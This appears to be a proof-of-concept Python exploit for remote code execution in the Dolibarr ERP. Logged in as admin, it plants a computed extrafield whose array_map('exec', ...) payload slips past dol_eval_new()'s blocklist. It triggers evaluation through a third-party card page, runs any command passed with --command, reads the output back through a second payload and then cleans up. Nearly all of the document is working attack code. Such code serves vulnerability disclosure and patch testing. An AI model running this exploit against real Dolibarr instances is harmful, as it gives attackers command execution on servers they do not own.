#!/usr/bin/env python3
"""
PoC: Remote Code Execution via dol_eval_new() on Dolibarr

Exploits the incomplete prohibited_functions list in dol_eval_new()
through the extrafield "computed value" feature.

Attack chain:
  1. Authenticate as admin
  2. Create a computed extrafield with an array_map("exec",...) payload
  3. Create a third party record
  4. View the record's card page — this calls fetch_optionals() which
     evaluates the computed field via dol_eval() -> dol_eval_new()
  5. Read the command output rendered in the page via markers, or
     from the temp file written by the payload

Requires: MAIN_USE_DOL_EVAL_NEW = 1 on the target instance.

Usage:
  python3 poc_rce_whoami.py
  python3 poc_rce_whoami.py --url http://target:8080 --command "id"
"""

import argparse
import re
import secrets
import subprocess
import sys
import time

import requests
requests.packages.urllib3.disable_warnings()

ATTR = "pocfield"


def get_token(session, url):
    resp = session.get(url)
    m = re.search(r'name="token"\s+value="([^"]+)"', resp.text)
    if not m:
        m = re.search(r'anti-csrf-newtoken"\s+content="([^"]+)"', resp.text)
    return m.group(1) if m else None


def login(session, base, user, pw):
    token = get_token(session, f"{base}/index.php")
    if not token:
        return False
    resp = session.post(
        f"{base}/index.php",
        data={
            "actionlogin": "login",
            "loginfunction": "loginfunction",
            "username": user,
            "password": pw,
            "token": token,
        },
        headers={"Referer": f"{base}/index.php"},
        allow_redirects=True,
    )
    return "actionlogin" not in resp.text


def set_extrafield(session, base, computed, action="add"):
    url = f"{base}/societe/admin/societe_extrafields.php"
    if action == "add":
        token = get_token(session, f"{url}?action=create&type=varchar")
    else:
        token = get_token(session, f"{url}?action=edit&attrname={ATTR}")
    if not token:
        return False
    resp = session.post(
        url,
        data={
            "action": action,
            "token": token,
            "attrname": ATTR,
            "label": ATTR,
            "type": "varchar",
            "size": "255",
            "pos": "100",
            "computed_value": computed,
            "list": "1",
            "totalizable": "0",
        },
        headers={"Referer": url},
        allow_redirects=True,
    )
    if "ErrorDuplicateField" in resp.text:
        return set_extrafield(session, base, computed, action="update")
    return True


def delete_extrafield(session, base):
    url = f"{base}/societe/admin/societe_extrafields.php"
    token = get_token(session, url)
    if token:
        session.post(
            url,
            data={"action": "delete", "token": token, "attrname": ATTR},
            headers={"Referer": url},
        )


def create_societe(session, base):
    url = f"{base}/societe/card.php"
    token = get_token(session, f"{url}?action=create")
    if not token:
        return None
    resp = session.post(
        url,
        data={
            "action": "add",
            "token": token,
            "name": f"poc_{secrets.token_hex(4)}",
            "client": "1",
            "fournisseur": "0",
            "status": "1",
        },
        headers={"Referer": url},
        allow_redirects=False,
    )
    loc = resp.headers.get("Location", "")
    m = re.search(r"socid=(\d+)", loc)
    return m.group(1) if m else None


def get_any_societe_id(session, base):
    resp = session.get(f"{base}/societe/list.php")
    m = re.search(r'societe/card\.php\?socid=(\d+)', resp.text)
    return m.group(1) if m else None


def main():
    p = argparse.ArgumentParser(description="Dolibarr dol_eval_new() RCE PoC")
    p.add_argument("--url", default="http://localhost:8080")
    p.add_argument("--user", default="admin")
    p.add_argument("--password", default="admin123")
    p.add_argument("--command", default="whoami")
    args = p.parse_args()

    outfile = f"/tmp/.dol_rce_{secrets.token_hex(6)}"
    marker = secrets.token_hex(6)
    s = requests.Session()
    s.verify = False

    print(f"[*] Target:  {args.url}")
    print(f"[*] Command: {args.command}")
    print()

    # ── 1. Login ─────────────────────────────────────────────────────
    print("[1] Authenticating...")
    if not login(s, args.url, args.user, args.password):
        print("    [-] Login failed"); sys.exit(1)
    print("    [+] OK")

    # ── 2. Inject exec payload via computed extrafield ───────────────
    # array_map is NOT in dol_eval_new()'s prohibited_functions list,
    # so it passes the sanitizer and calls exec() with our command.
    #
    # Note: the "create" action sanitizes computed_value with 'alpha'
    # (strips quotes), but the "update" action uses 'nohtml' (preserves
    # them). So we create with a dummy value first, then update.
    exec_payload = (
        f'implode("", array_map("exec", '
        f'array("{args.command} > {outfile} 2>&1")))'
    )
    print(f"[2] Creating computed extrafield...")
    print(f"    Payload: array_map(\"exec\", [\"{args.command} > outfile\"])")
    set_extrafield(s, args.url, "1")
    set_extrafield(s, args.url, exec_payload, action="update")

    # ── 3. Trigger eval via card page ────────────────────────────────
    # The card page calls $object->fetch() -> fetch_optionals()
    # which evaluates computed fields via dol_eval(..., '2')
    socid = get_any_societe_id(s, args.url)
    if not socid:
        print("[3] Creating a third party record...")
        socid = create_societe(s, args.url)
    if not socid:
        print("    [-] Could not find or create a third party"); sys.exit(1)

    print(f"[3] Triggering eval via /societe/card.php?socid={socid}")
    s.get(f"{args.url}/societe/card.php?socid={socid}")
    time.sleep(0.3)

    # ── 4. Read output ───────────────────────────────────────────────
    # Swap the computed value to read the output file with markers
    read_payload = (
        f'"__RCE_{marker}_" . trim(file_get_contents("{outfile}")) '
        f'. "_{marker}_RCE__"'
    )
    set_extrafield(s, args.url, read_payload, action="update")

    resp = s.get(f"{args.url}/societe/card.php?socid={socid}")
    m = re.search(f"__RCE_{marker}_(.*?)_{marker}_RCE__", resp.text, re.DOTALL)

    output = None
    if m:
        output = re.sub(r"<[^>]+>", "", m.group(1)).strip()
        output = (output.replace("&lt;", "<").replace("&gt;", ">")
                  .replace("&amp;", "&").replace("&quot;", '"'))

    if not output:
        # Fallback: read the file locally (works when PoC runs on the target)
        try:
            r = subprocess.run(["cat", outfile], capture_output=True, text=True, timeout=2)
            if r.stdout.strip():
                output = r.stdout.strip()
        except Exception:
            pass

    if output:
        print()
        print("    ┌" + "─" * 54 + "┐")
        print(f"    │  RCE CONFIRMED                                    │")
        print(f"    │  Command: {args.command:<42} │")
        print(f"    │  Output:  {output:<42} │")
        print("    └" + "─" * 54 + "┘")
    else:
        print("    [-] Could not retrieve command output")
        print("    [*] Verify MAIN_USE_DOL_EVAL_NEW=1 in llx_const")

    # ── Cleanup ──────────────────────────────────────────────────────
    print()
    print("[*] Cleaning up...")
    delete_extrafield(s, args.url)
    subprocess.run(["rm", "-f", outfile], capture_output=True)
    print("[+] Done")


if __name__ == "__main__":
    main()
